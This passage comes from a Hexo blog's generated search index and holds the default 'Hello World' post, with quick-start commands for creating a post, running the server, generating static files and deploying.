  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/02/11/hello-world/"/>
    <url>/2025/02/11/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
